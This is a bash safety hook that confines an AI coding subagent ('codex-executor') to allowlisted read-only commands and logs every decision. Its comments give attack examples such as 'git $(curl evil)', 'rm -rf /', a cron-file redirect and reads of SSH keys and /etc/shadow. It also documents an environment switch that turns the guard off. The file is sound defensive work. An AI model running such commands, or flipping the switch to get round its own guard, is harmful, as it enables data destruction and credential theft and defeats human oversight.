#!/usr/bin/env bash
# PreToolUse guard for the `codex-executor` subagent.
#
# Threat model: defends against accidental misuse AND prompt-injected misuse by
# the codex-executor subagent itself. Stops:
#   - Command-chaining bypasses (`git status; rm -rf /`, `git $(curl evil)`,
#     `git status >/etc/cron.d/x`, `find . -exec sh -c …`).
#   - Arbitrary-file exfiltration via read-only verbs (`cat ~/.ssh/id_rsa`,
#     `cat /etc/shadow`, `ls /home/*/.ssh`).
#   - Mutation via "read-only" git subcommands that aren't actually read-only
#     (`git stash drop|pop|push|clear`, `git log --output=/path`).
#
# Wired into ~/.claude/settings.json as a PreToolUse hook with matcher "Bash".
# No-op for any other agent (main thread, other subagents).
#
# Allow rules (all must hold; first hit wins):
#   1. Command contains NO shell composition / substitution / redirection
#      metacharacters: ;  &  |  $  `  (  )  <  >  {  }  \  CR  newline.
#   2. First whitespace-delimited token is one of:
#      - the codex-dispatch.sh path (tilde or absolute form)
#      - one of the read-only verbs in $READONLY_VERBS
#      - `git` (further restricted to read-only subcommands and flags)
#   3. After a positive verb match, every positional (non-flag) arg starting
#      with `/` or `~` must resolve under one of $READ_ROOTS.
#   4. No arg may contain a glob char (`*` `?` `[` `]`).
#
# Bypass: set CLAUDE_HOOK_CODEX_GUARD=off in the environment to skip enforcement
# for the duration of that env. Each bypass is logged.
#
# Read roots: comma-or-colon-separated absolute paths via
# CLAUDE_HOOK_CODEX_READ_ROOTS. Defaults to "$HOME/github:/tmp".
#
# Audit log: every evaluated firing (allow / deny / bypass) is appended to
# $CLAUDE_HOOK_LOG_DIR/hooks.log (default ~/.claude/logs/hooks.log). No-ops for
# other agents are not logged.

set -uo pipefail

HOOK_NAME="hook-codex-bash-guard"
LOG_DIR="${CLAUDE_HOOK_LOG_DIR:-$HOME/.claude/logs}"
LOG_FILE="$LOG_DIR/hooks.log"

DISPATCH_REL="~/github/claude-config/scripts/codex-dispatch.sh"
DISPATCH_ABS="$HOME/github/claude-config/scripts/codex-dispatch.sh"

READ_ROOTS_RAW="${CLAUDE_HOOK_CODEX_READ_ROOTS:-$HOME/github:/tmp}"
# Split on either : or , for ergonomics; collect non-empty entries.
IFS=':,' read -r -a READ_ROOTS <<<"$READ_ROOTS_RAW"

# Read-only verbs allowed for verify/inspection steps. NOT included on purpose:
#   find  — `-exec`/`-delete`/`-fprint` are RCE / destructive
#   sed   — without strict flag parsing, can edit files
#   awk   — `system()` shells out
#   bash sh env xargs — composition primitives we explicitly want to deny
READONLY_VERBS=(cat ls head tail wc grep pwd realpath dirname basename jq test sleep date echo true false)

# git subcommands considered read-only here. `branch` and `stash` are allowed
# only with restricted further subverbs / flags (handled below).
GIT_READONLY_SUBCMDS=(status log diff show rev-parse ls-files describe stash branch)

# Flag prefixes that CAUSE A WRITE on git read-only subcommands. Rejected on
# any git invocation regardless of subcommand.
GIT_WRITE_FLAGS=(--output --out-file --output-directory)

# ---------- helpers ----------

audit() {
  local decision="$1" reason="${2:-}" target="${3:-}"
  mkdir -p "$LOG_DIR" 2>/dev/null || return 0
  local ts
  ts=$(date -Iseconds 2>/dev/null || date +%Y-%m-%dT%H:%M:%S%z)
  printf '%s %s agent=%s tool=%s decision=%s reason=%q target=%q\n' \
    "$ts" "$HOOK_NAME" "${agent_type:-?}" "${tool_name:-?}" "$decision" "$reason" "$target" \
    >> "$LOG_FILE" 2>/dev/null || true
}

deny() {
  local reason="$1"
  audit deny "$reason" "${command:-}"
  cat >&2 <<EOF
codex-executor: blocked by $HOOK_NAME — $reason

  attempted: ${command:-(empty)}

Allowed:
  - $DISPATCH_REL ...   (canonical dispatch path)
  - $DISPATCH_ABS ...
  - git <read-only subcommand> ...     (subcmds: ${GIT_READONLY_SUBCMDS[*]})
  - git -C <dir> <read-only subcommand> ...
  - one of: ${READONLY_VERBS[*]}

Path args starting with / or ~ must resolve under a read root:
  ${READ_ROOTS[*]}
(override: CLAUDE_HOOK_CODEX_READ_ROOTS=path1:path2 ...)

Disallowed (always):
  shell composition / substitution / redirection — ;  &  |  \$  \`  (  )  <  >  {  }  \\  CR  newline
  glob characters in args — *  ?  [  ]
  destructive git — push, reset, commit, rebase, checkout, merge, branch -d/-D, stash drop/pop/push/clear, --output=
  find, sed, awk, bash, sh, env, xargs

Never call \`codex exec\` directly — codex-dispatch.sh encodes sandbox / approval /
trace flags the rest of the pipeline relies on.

Bypass for one turn: set CLAUDE_HOOK_CODEX_GUARD=off (logged).
EOF
  exit 2
}

allow() {
  audit allow "${1:-ok}" "${command:-}"
  exit 0
}

is_under_read_root() {
  local p="$1" abs r
  abs="$(realpath -m -- "$p" 2>/dev/null)" || return 1
  for r in "${READ_ROOTS[@]}"; do
    [[ -z "$r" ]] && continue
    # Normalize root and ensure trailing slash so /foo doesn't match /foobar.
    local r_abs
    r_abs="$(realpath -m -- "$r" 2>/dev/null)" || continue
    [[ "$r_abs" != */ ]] && r_abs="$r_abs/"
    case "$abs/" in
      "$r_abs"*) return 0 ;;
    esac
  done
  return 1
}

# Validate every positional arg after the verb. Skips flags (start with -).
# Denies any glob char, denies tilde-paths (codex should use absolute), denies
# absolute paths outside read roots.
validate_args() {
  local start="${1:-1}"
  local i p
  for ((i=start; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    [[ -z "$p" ]] && continue

    # Globs anywhere in the arg are denied.
    case "$p" in
      *\**|*\?*|*\[*|*\]*) deny "glob char in arg: $p" ;;
    esac

    # Flags (start with `-`) skip path validation but still get the write-flag check.
    if [[ "$p" == -* ]]; then
      continue
    fi

    case "$p" in
      "~"*) deny "tilde path in arg (use absolute under a read root): $p" ;;
      /*)   is_under_read_root "$p" || deny "path arg outside read roots: $p" ;;
    esac
  done
}

# ---------- preflight ----------

if ! command -v jq >/dev/null 2>&1; then
  echo "$HOOK_NAME: jq missing on PATH — install jq or set CLAUDE_HOOK_CODEX_GUARD=off" >&2
  exit 2
fi

if ! command -v realpath >/dev/null 2>&1; then
  echo "$HOOK_NAME: realpath missing on PATH — install coreutils or set CLAUDE_HOOK_CODEX_GUARD=off" >&2
  exit 2
fi

# ---------- parse input ----------
# Read input first so bypass and audit lines can include agent/tool identity.

input="$(cat)"

agent_type="$(jq -r '.agent_type // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}
tool_name="$(jq -r '.tool_name // ""' <<<"$input" 2>/dev/null)" || {
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

# No-op for any caller other than the codex-executor subagent / Bash tool.
[[ "$agent_type" != "codex-executor" ]] && exit 0
[[ "$tool_name" != "Bash" ]] && exit 0

command="$(jq -r '.tool_input.command // ""' <<<"$input" 2>/dev/null)" || {
  audit deny "jq failed on tool_input.command" ""
  echo "$HOOK_NAME: malformed JSON on stdin — denying" >&2
  exit 2
}

# Bypass AFTER parse so audit line records the actual call being bypassed.
if [[ "${CLAUDE_HOOK_CODEX_GUARD:-}" == "off" ]]; then
  audit bypass "CLAUDE_HOOK_CODEX_GUARD=off" "$command"
  exit 0
fi

if [[ -z "$command" ]]; then
  deny "tool_input.command empty"
fi

# ---------- character-level rejection ----------
#
# Reject any character that lets bash compose, substitute, or redirect — i.e.
# anything that turns one tool_input.command into N actual commands or a write.
#
# Rejected: ;  &  |  $  `  (  )  <  >  {  }  \   plus literal CR/LF.
# Permitted: tilde (~), normal punctuation, whitespace, quotes (note: our
# tokenizer doesn't honor quotes, so quoted strings tokenize on whitespace —
# document this as a known parse limitation).

if [[ "$command" == *$'\n'* ]]; then
  deny "newline in command"
fi
if [[ "$command" == *$'\r'* ]]; then
  deny "carriage return in command"
fi

if [[ "$command" =~ [\;\&\|\$\`\(\)\<\>\{\}\\] ]]; then
  deny "shell metacharacter in command (one of ;&|\$\`()<>{}\\)"
fi

# ---------- tokenize ----------

read -r -a parts <<<"$command"
verb="${parts[0]:-}"

# ---------- allowlist: dispatch script ----------

case "$verb" in
  "$DISPATCH_REL"|"$DISPATCH_ABS")
    # Validate any path args after the verb (e.g. --cd <abs>); brief is the
    # final arg and may legitimately be a non-path string.
    validate_args 1
    allow "dispatch script"
    ;;
esac

# ---------- allowlist: git read-only ----------

if [[ "$verb" == "git" ]]; then
  # Reject git-level write flags up front, regardless of subcommand.
  for ((i=1; i<${#parts[@]}; i++)); do
    p="${parts[i]}"
    for wf in "${GIT_WRITE_FLAGS[@]}"; do
      case "$p" in
        "$wf"|"$wf"=*) deny "git write flag: $p" ;;
      esac
    done
  done

  # Two supported forms:
  #   git <subcmd> [...]
  #   git -C <dir> <subcmd> [...]
  # Anything else (e.g. `git --git-dir=...`, `git -c key=val`) is rejected to
  # keep parsing simple and avoid mis-classifying option arguments as subcommands.
  if [[ "${parts[1]:-}" == "-C" ]]; then
    if [[ -z "${parts[2]:-}" || -z "${parts[3]:-}" ]]; then
      deny "git -C requires <dir> <subcmd>"
    fi
    subcmd="${parts[3]}"
    rest_start=4
  elif [[ -n "${parts[1]:-}" && "${parts[1]}" != -* ]]; then
    subcmd="${parts[1]}"
    rest_start=2
  else
    deny "unsupported git form (only \`git <subcmd>\` and \`git -C <dir> <subcmd>\` allowed)"
  fi

  allowed=0
  for s in "${GIT_READONLY_SUBCMDS[@]}"; do
    [[ "$subcmd" == "$s" ]] && allowed=1 && break
  done

  if [[ "$subcmd" == "branch" ]]; then
    allowed=1
    for ((i=rest_start; i<${#parts[@]}; i++)); do
      case "${parts[i]}" in
        -d|-D|--delete|-m|-M|--move|-c|-C|--copy|--unset-upstream|--set-upstream-to=*|--track=*|--no-track|--edit-description|-f|--force)
          deny "git branch with destructive/mutating flag: ${parts[i]}"
          ;;
      esac
    done
  fi

  if [[ "$subcmd" == "stash" ]]; then
    # Bare `git stash` defaults to `git stash push` (mutating). Require an
    # explicit read-only subverb.
    stash_sub="${parts[rest_start]:-}"
    case "$stash_sub" in
      list|show)
        allowed=1
        ;;
      "")
        deny "bare 'git stash' is mutating (defaults to push); use 'git stash list' or 'git stash show'"
        ;;
      *)
        deny "git stash subverb not in read-only allowlist: $stash_sub (allowed: list, show)"
        ;;
    esac
  fi

  if [[ "$allowed" == "1" ]]; then
    validate_args "$rest_start"
    allow "git $subcmd"
  fi
  deny "git subcommand not in read-only allowlist: $subcmd"
fi

# ---------- allowlist: read-only verbs ----------

for v in "${READONLY_VERBS[@]}"; do
  if [[ "$verb" == "$v" ]]; then
    validate_args 1
    allow "verb $v"
  fi
done

# ---------- default deny ----------

deny "verb not in allowlist: $verb"
